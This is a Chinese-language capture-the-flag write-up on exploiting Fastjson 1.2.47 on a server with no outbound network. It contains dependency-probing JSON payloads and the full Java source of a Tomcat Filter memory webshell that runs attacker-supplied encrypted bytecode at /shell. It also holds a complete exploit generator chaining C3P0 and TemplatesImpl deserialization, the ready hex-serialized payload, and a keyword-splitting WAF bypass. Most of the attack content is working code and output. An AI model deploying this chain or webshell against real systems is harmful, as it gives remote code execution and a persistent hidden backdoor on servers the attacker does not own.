这个环境本身有点特殊，docker起的两台机器，构造的机器不出网环境。
探测具体版本：
```json
{
  "@type": "java.lang.AutoCloseable"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696408067757-dc0bcfb3-0dea-491b-a6bd-760ce8c734d9.png#averageHue=%23fefdfd&clientId=ue31fa4aa-f0f6-4&from=paste&height=202&id=u57998868&originHeight=253&originWidth=1375&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37122&status=done&style=none&taskId=u9ca86635-2880-47ab-b043-102bce3caf1&title=&width=1100)
爆出版本为1.2.47，在这个版本及以下Fastjson存在mappings缓存通杀绕过，利用的方式为JNDI，但不要忘了JNDI的利用是有一定条件的：1.一般需要出网环境，2.受到JDK版本限制，JDK8u191后受到trusturlcodebase限制远程加载，但也有绕过方法。这里因为机器不出网，JNDI注入并不太合适，所以需要找其他方法。
因此下一步探测存在的依赖。利用Character转换报错可以判断存在何种依赖，
```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "org.springframework.web.bind.annotation.RequestMapping"
		}
	}
```
RequestMapping本身为SpringBoot下的类，当存在该类时会报出类型转换错误，说明为SpringBoot项目
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695131808175-46701a83-cddd-43fd-9a0c-5ae82def19ea.png#averageHue=%23fefafa&clientId=u179027cd-7e4a-4&from=paste&height=200&id=u4470bbd9&originHeight=250&originWidth=1455&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44762&status=done&style=none&taskId=u68c2a9f2-03bc-4d68-936b-28c9dcde318&title=&width=1164)
否则无显示：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695131946333-bbc03141-efda-4f2a-b346-b914be4102c9.png#averageHue=%23fefcfc&clientId=u179027cd-7e4a-4&from=paste&height=189&id=u3a6f8a2c&originHeight=236&originWidth=1202&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43646&status=done&style=none&taskId=ucce12f3d-bba6-4ae6-8cb0-c088a0732e7&title=&width=961.6)
因此，通过这种方法结合已知的FastJson利用链Poc所需要的依赖类，最终探测服务中存在C3P0依赖
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695132114541-39301de7-b406-4af2-b1d9-8d9a8cb8cc88.png#averageHue=%23fefcfb&clientId=u179027cd-7e4a-4&from=paste&height=182&id=uf7a140fe&originHeight=227&originWidth=1396&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42967&status=done&style=none&taskId=u75063fb9-e980-4890-b1b8-7b5c5e3f10d&title=&width=1116.8)
FastJson本身结合C3P0有很多利用方式，其中提的最多的是不出网利用，hex base二次反序列化打内存马。
在c3p0+FastJson利用其他文章中介绍的是需要依赖像cc链这样的反序列化链，但其实是不需要的，因为FastJson全版本都存在原生反序列化漏洞，且是通过TemplatesImpl加载类，很适合打内存马。
先找一个冰蝎内存马:[Tomcat的Filter型内存马](https://github.com/Getshell/Mshell/tree/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat)
但是直接引用是不行的，在C3P0二次反序列化环境中，如果针对不出网机器，需要使用的是TemplatesImpl这条链加载恶意字节码。但是对于使用TemplatesImpl，需要在恶意类中继承`AbstractTranslet`,并重写他的两个方法，否则该类无法被加载。
更改后的内存马如下：FRain.java
记得编译为class文件。
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;

public class IceShell extends AbstractTranslet implements Filter {
    private final String pa = "3ad2fddfe8bad8e6";

    public IceShell() {
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;
        HttpSession session = request.getSession();
        Map<String, Object> pageContext = new HashMap();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        if (request.getMethod().equals("POST")) {
            Class Lclass;
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Lclass = cl.getClass().getSuperclass();
                this.RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Lclass = cl.getClass().getSuperclass().getSuperclass();
                this.RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                this.RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                this.RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                this.RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                this.RushThere(Lclass, cl, session, request, pageContext);
            }

            filterChain.doFilter(servletRequest, servletResponse);
        }

    }

    public void destroy() {
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext) {
        byte[] bytecode = Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");

        try {
            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            define.setAccessible(true);
            Class uclass = null;

            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException var18) {
                uclass = (Class)define.invoke(cl, bytecode, 0, bytecode.length);
            }

            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = "3ad2fddfe8bad8e6";
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class)Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        } catch (Exception var19) {
        }

    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        try {
            String name = "AutomneGreet";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map)Configs.get(standardContext);
            if (filterConfigs.get("AutomneGreet") == null) {
                Filter filter = new IceShell();
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName("AutomneGreet");
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/shell");
                filterMap.setFilterName("AutomneGreet");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);
                filterConfigs.put("AutomneGreet", filterConfig);
            }
        } catch (Exception var10) {
        }

    }
}

```
之后就是关于C3P0二次反序列这条链，细节就不说了，与之前唯一个区别是之前使用的CC6那条反序列化链，但是其实fastjson全版本都存在类似CC这样的原生反序列化链漏洞，就不在需要对方环境中存在CC这样的依赖。
最终exp如下：
```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class Test {
    public static void main(String[] args) throws Exception {
        String hex2 = bytesToHex(tobyteArray(gen()));
        String FJ1247 = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "        \"userOverridesAsString\":\"HexAsciiSerializedMap:" + hex2 + ";\",\n" +
                "    }\n" +
                "}\n";
        System.out.println(FJ1247);
    }
    //FastJson原生反序列化加载恶意类字节码
    public static Object gen() throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        byte[] bytes = Files.readAllBytes(Paths.get("e:\\FRain.class")); //刚才做好的内存马我是放在e盘下，读取其中字节即可
        setValue(templates, "_bytecodes", new byte[][]{bytes});
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);
        return hashMap;
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //将类序列化为字节数组
    public static byte[] tobyteArray(Object o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(o);   //
        return bao.toByteArray();
    }

    //字节数组转十六进制
    public static String bytesToHex(byte[] bytes) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xff);      //bytes[]中为带符号字节-255~+255，&0xff: 保证得到的数据在0~255之间
            if (hex.length()<2){
                stringBuffer.append("0" + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误
            }else {
                stringBuffer.append(hex);
            }
        }
        return stringBuffer.toString();
    }
}
```
运行exp即可生成一段json数据：
```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    },
    "b":{
        "@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "userOverridesAsString":"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e002000078700000187ecafebabe0000003401280a004300930700940800950b000200960b009700980a0099009a0a0099009b07009c07009d0a009e009f0a000900a00a000800a10700a20a000d00930a000800a30a000d00a40a000d00a50a000d00a60b00a700a80a00a900aa0a00ab00ac0a00ab00ad0a00ab00ae0800af0a00b000b10a00b000b20700b30a001b00b40b00b500b60700b70800b80a003b00b908008e0a003b00ba0a00bb00bc0a00bb00bd0700be0b002500bd0700bf0a002700930700c00a002900930a002900c10a002900c20a003f00c30a003b00c40a002900c50a001e00c60700c70a003100930800c80a003100c90a003100c20900ca00cb0a00ca00cc0a003100cd0a001e00ce0700cf0700d00700d10a003b00d20a00d300bc0700d40a00d300d50b002500d60700d70700d80700d90100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100074c465261696e3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e730700da0100104d6574686f64506172616d6574657273010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b295601000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000e62756666657265645265616465720100184c6a6176612f696f2f42756666657265645265616465723b01000d737472696e674275696c6465720100194c6a6176612f6c616e672f537472696e674275696c6465723b0100046c696e650100124c6a6176612f6c616e672f537472696e673b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b0100037265710100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b01000d537461636b4d61705461626c650700940700db07009c0700a20700dc0700bf0700dd0700de0700df0700e001000764657374726f790100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0700e10100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b01000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000f4c6a6176612f7574696c2f4d61703b0700d701000a536f7572636546696c6501000a465261696e2e6a6176610c004500460100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100046368616e0c00e200e30700df0c005300e40700e50c00e600e70c00e800e90100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720700db0c00ea00eb0c004500ec0c004500ed0100176a6176612f6c616e672f537472696e674275696c6465720c00ee00ef0c00f000f10c00f000f20c00f300ef0700de0c00f400f50700dc0c00f600f70700f80c00f900fa0c00fb00460c00fc004601000c4175746f6d6e6547726565740700fd0c00fe00ff0c010001010100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c010201030701040c010501060100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c010701080c0109010a07010b0c010c010d0c010e010f01000d6a6176612f7574696c2f4d6170010005465261696e01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c011001110c011201130c011401150c011600ef0c011701130c0118011901002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100022f2a0c011a011307011b0c011c011d0c008700ef0c011e01130c011f01200100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701000f6a6176612f6c616e672f436c61737301001b6f72672f6170616368652f636174616c696e612f436f6e746578740c012101220701230100106a6176612f6c616e672f4f626a6563740c012401250c012601270100136a6176612f6c616e672f457863657074696f6e010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e0100116a6176612f6c616e672f50726f636573730100106a6176612f6c616e672f537472696e6701001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e0100136a6176612f696f2f494f457863657074696f6e010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000c676574506172616d65746572010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c6a6176612f696f2f5265616465723b2956010008726561644c696e6501001428294c6a6176612f6c616e672f537472696e673b010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b01001c2843294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e6701000f6765744f757470757453747265616d01002528294c6a617661782f736572766c65742f536572766c65744f757470757453747265616d3b010008676574427974657301000428295b420100216a617661782f736572766c65742f536572766c65744f757470757453747265616d0100057772697465010005285b422956010005666c757368010005636c6f73650100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b2956010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0021002700430001004400000007000100450046000100470000003300010001000000052ab70001b10000000200480000000a0002000000170004001800490000000c000100000005004a004b00000001004c004d00030047000000350000000200000001b10000000200480000000600010000001c004900000016000200000001004a004b000000000001004e004f00010050000000040001005100520000000501004e0000000100530054000300470000017400050009000000982bc000023a0419041203b900040200c7000e2d2b2cb900050300a7007db8000619041203b900040200b600073a05bb000859bb0009591905b6000ab7000bb7000c3a06bb000d59b7000e3a071906b6000f593a08c600201907bb000d59b7000e1908b60010100ab60011b60012b6001057a7ffdb2cb9001301001907b60012b60014b600152cb900130100b600162cb900130100b60017b100000003004800000032000c0000001f0006002000120021001d0023002e002400430025004c0028005700290074002c0085002d008e002e0097003000490000005c0009002e006900550056000500430054005700580006004c004b0059005a000700540043005b005c000800000098004a004b000000000098005d005e000100000098005f0060000200000098006100620003000600920063006400040065000000300004fc001d070066fe002e070067070068070069fc002707006aff0022000507006b07006c07006d07006e07006600000050000000060002006f005100520000000d03005d0000005f000000610000000100700046000100470000002b0000000100000001b10000000200480000000600010000003300490000000c000100000001004a004b0000000100710072000300470000003f0000000300000001b100000002004800000006000100000036004900000020000300000001004a004b000000000001007300740001000000010075007600020050000000040001007700520000000902007300000075000000010071007800030047000000490000000400000001b10000000200480000000600010000003900490000002a000400000001004a004b000000000001007300740001000000010079007a000200000001007b007c00030050000000040001007700520000000d030073000000790000007b00000008007d004600010047000001da0005000a000000de12184bb80019b6001ac0001b4c2bb6001cb9001d0100c0001e4d121fb800201221b600224e2d04b600232d2cb60024c000253a0419041218b900260200c7009cbb002759b700283a05bb002959b7002a3a0619061905b6002b19061218b6002c19061905b6002db6002eb6002f2c1906b60030bb003159b700323a0719071233b6003419071218b600351907b20036b60037b600382c1907b60039123a05bd003b5903123c535904122953b6003d3a08190804b6003e190805bd003f59032c535904190653b60040c0003a3a09190412181909b90041030057a700044bb10001000000d900dc0042000300480000006600190000003d0003003e000d003f001a004000250041002a0042003400430040004400490045005200460059004700600048006d00490073004a007c004b0083004c008a004d0095004e009b004f00b0005000b6005100cd005200d9005500dc005400dd0057004900000066000a00490090007e007f000500520087008000810006007c005d00820083000700b0002900840085000800cd000c004e00860009000300d60087005c0000000d00cc008800890001001a00bf008a008b0002002500b4008c008d0003003400a5008e008f000400650000000a0003fb00d9420700900000010091000000020092707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000002774000454657374740009546573742e6a61766174000367656e7371007e00170000000f71007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;",
    }
}
```
被拦了，可以发现是过滤的userOverridesAsString，后来尝试unicode、hex编码绕过依然不行。因为在代码中过滤了\u,\x等编码前缀
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696409331725-e758f9f9-022e-498d-9671-27f14611301e.png#averageHue=%23fefefe&clientId=ue31fa4aa-f0f6-4&from=paste&height=286&id=ub951b5e6&originHeight=357&originWidth=1379&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77239&status=done&style=none&taskId=uae513566-6e1e-41ce-ab97-55f3591b11d&title=&width=1103.2)
但还可以使用添加`_`或`+`处理关键字绕过，可参考[Y4tacker的文章](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696409895416-aee9e9a2-dec7-44bd-b392-22454d3f4e10.png#averageHue=%23fefefd&clientId=ue31fa4aa-f0f6-4&from=paste&height=286&id=ub540077e&originHeight=357&originWidth=1304&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78783&status=done&style=none&taskId=u931b075d-0497-47bf-a5a7-2f16f125c9e&title=&width=1043.2)
这种报错便是注入内存马成功了。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696409937124-0ac85f6f-dfdf-482d-b273-9b84c47c30a3.png#averageHue=%23ceb893&clientId=ue31fa4aa-f0f6-4&from=paste&height=139&id=u7cd519e9&originHeight=174&originWidth=665&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8179&status=done&style=none&taskId=u1813e528-6ab9-4d2a-9bec-4c7d4fc1006&title=&width=532)
获取flag：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696409963894-3ce1bef1-8b9a-4026-96b1-42dc767dc566.png#averageHue=%23ccc8ad&clientId=ue31fa4aa-f0f6-4&from=paste&height=102&id=u4fdc9e05&originHeight=128&originWidth=626&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8025&status=done&style=none&taskId=u35c0cac3-5c69-43e9-a550-1323e0925a6&title=&width=500.8)
